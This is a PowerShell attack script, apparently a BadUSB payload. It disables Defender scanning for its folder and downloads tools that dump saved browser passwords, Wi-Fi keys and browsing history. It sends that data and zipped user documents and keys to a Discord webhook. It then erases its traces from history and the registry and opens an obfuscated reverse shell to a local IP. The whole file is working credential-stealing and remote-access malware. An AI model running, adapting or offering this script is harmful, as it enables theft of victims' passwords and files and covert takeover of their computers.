#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                        

$basePath = "C:\Users\$env:USERNAME\Downloads\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# Create directory
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Add-MpPreference -ExclusionPath $basePath -Force

# Download necessary tools
$zipUrl = "https://github.com/Sunlaii/ANM-Esp32BadUSB/raw/refs/heads/MinhNhat/tools.zip"
Invoke-WebRequest $zipUrl -OutFile "tools.zip"

# Giải nén ngay lập tức
Expand-Archive -Path "tools.zip" -DestinationPath "." -Force

# CHẠY ĐA LUỒNG: Kích hoạt 4 công cụ quét cùng một lúc
Start-Process -FilePath ".\WNetWatcher.exe" -ArgumentList "/stext connected_devices.txt" -WindowStyle Hidden
Start-Process -FilePath ".\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext history.txt" -WindowStyle Hidden
Start-Process -FilePath ".\WebBrowserPassView.exe" -ArgumentList "/stext passwords.txt" -WindowStyle Hidden
Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" -WindowStyle Hidden

# Wait for files to be created (timeout 60s)
$maxWait = 60
$waited = 0
while ($waited -lt $maxWait) {
    if ((Test-Path "passwords.txt") -and (Test-Path "wifi.txt") -and (Test-Path "connected_devices.txt") -and (Test-Path "history.txt")) {
        break
    }
    Start-Sleep -Seconds 1
    $waited++
}

# ============================================
# DISCORD WEBHOOK
# ============================================

$hookurl = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"

# ============================================
# GỬI TỪNG FILE TXT TRỰC TIẾP (KHÔNG CẦN DI CHUYỂN)
# ============================================

function Send-FileToDiscord {
    param([string]$FilePath)
    if (!(Test-Path $FilePath)) { return }
    
    $fileContent = Get-Content $FilePath -Raw
    $fileName = [System.IO.Path]::GetFileName($FilePath)
    
    if ($fileContent.Length -gt 1900) {
        $fileContent = $fileContent.Substring(0, 1900) + "`n... [File too long]"
    }
    
    $payload = @{ content = "**📁 $fileName**`n```$fileContent```" } | ConvertTo-Json
    
    try {
        Invoke-RestMethod -Uri $hookurl -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing
        Write-Output "✅ Sent: $fileName"
    } catch {}
}

# Gửi trực tiếp từ thư mục hiện tại (không cần di chuyển)
Send-FileToDiscord -FilePath ".\passwords.txt"
Send-FileToDiscord -FilePath ".\wifi.txt"
Send-FileToDiscord -FilePath ".\connected_devices.txt"
Send-FileToDiscord -FilePath ".\history.txt"

# ============================================
# ẨN CỬA SỔ (CHO FINDSEND)
# ============================================

$hide = 'y'
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
    if($w -ne [System.IntPtr]::Zero){
        $t::ShowWindowAsync($w,0)
    }else{
        $Host.UI.RawUI.WindowTitle = 'xx'
        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
        $w=$p.MainWindowHandle
        $t::ShowWindowAsync($w,0)
    }
}

# ============================================
# FINDSEND (QUÉT FILE VÀ GỬI QUA DISCORD)
# ============================================

Function FindAndSend {
    param ([string[]]$FileType,[string[]]$Path)
    $maxZipFileSize = 10MB
    $currentZipSize = 0
    $index = 1
    $zipFilePath ="$env:temp/Loot$index.zip"
    
    $Path = "DownLoads"
    If($Path -ne $null){
        $foldersToSearch = "$env:USERPROFILE\"+$Path
    }else{
        $foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
    }
    
    If($FileType -ne $null){
        $fileExtensions = "*."+$FileType
    }else {
        $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
    }
    
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
    
    foreach ($folder in $foldersToSearch) {
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
            foreach ($file in $files) {
                $fileSize = $file.Length
                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                    $zipArchive.Dispose()
                    $currentZipSize = 0
                    curl.exe -F file1=@"$zipFilePath" $hookurl
                    Remove-Item -Path $zipFilePath -Force
                    Sleep 1
                    $index++
                    $zipFilePath ="$env:temp/Loot$index.zip"
                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                }
                $entryName = $file.FullName.Substring($folder.Length + 1)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                $currentZipSize += $fileSize
            }
        }
    }
    $zipArchive.Dispose()
    curl.exe -F file1=@"$zipFilePath" $hookurl
    Remove-Item -Path $zipFilePath -Force
    Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
}

FindAndSend

# ============================================
# DỌN DẸP DẤU VẾT
# ============================================

Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    Remove-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
} catch {}

Set-Location "C:\"
Remove-Item -Path $basePath -Recurse -Force
Remove-MpPreference -ExclusionPath $basePath -Force

# ============================================
# REVERSE SHELL
# ============================================

$47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358='P'+'S ';$4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c='1'+""+'9'+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+'2'+'.'+""+""+'1'+""+'6'+""+""+""+""+""+""+""+""+""+""+""+""+""+'8'+'.'+'2'+'.'+""+'4'+""+""+""+""+""+""+""+"";$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d = n''ew''-OB''je''CT system.net.sockets.tcpclient($4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c,6969);$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1 = $948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.GetStream();[byte[]]$bytes = 0..65535|%{0};sleep(0.1);sleep(0.1);sleep(0.1);sleep(0.1);while(($i = $06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Read($bytes, 0, $bytes.Length)) -ne 0){;$2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 = (n''Ew-oB''J''eC''t -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i''e''x'' -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire $2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 2>&1 | O''U''t-S''TrI''n''G );$sendback2 = $sendback + $47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358.SubString(0,3) + (SP''L''iT-P''A''t''h -path "$(p''w''D'')\0x00") + '> ';sleep 0.01;sleep 0.01;$d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb = ([text.encoding]::ASCII).GetBytes($sendback2);sleep 0.01;$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Write($d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb,0,$d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb.Length);sleep 0.01;$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Flush()};sleep 0.01;$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.Close()

# ============================================
# KẾT THÚC
# ============================================

Stop-Process -Id $PID -Force
